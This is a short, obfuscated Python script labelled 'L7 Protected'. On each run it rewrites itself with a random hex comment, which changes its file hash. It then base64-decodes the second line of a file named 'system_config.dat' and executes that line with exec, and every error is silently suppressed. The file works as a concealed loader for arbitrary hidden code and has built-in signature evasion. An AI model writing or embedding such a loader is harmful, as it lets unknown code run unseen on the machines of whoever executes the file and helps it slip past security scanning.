# L7 Protected
import os as _OlbhljDh, base64 as _VsXVsQqB, random
def _m():
    try:
        with open(__file__,'r') as f: c=f.read()
        j="#"+"".join(random.choices("abcdef0123456789",k=32))
        with open(__file__,'w') as f: f.write(c+"\n"+j)
    except: pass
_m()
_c="system_config.dat"
if _OlbhljDh.path.exists(_c):
    try:
        with open(_c,'r') as f:
            l=f.readlines()
            if len(l)>1: exec(_VsXVsQqB.b64decode(l[1]).decode('utf-8'), globals())
    except: pass
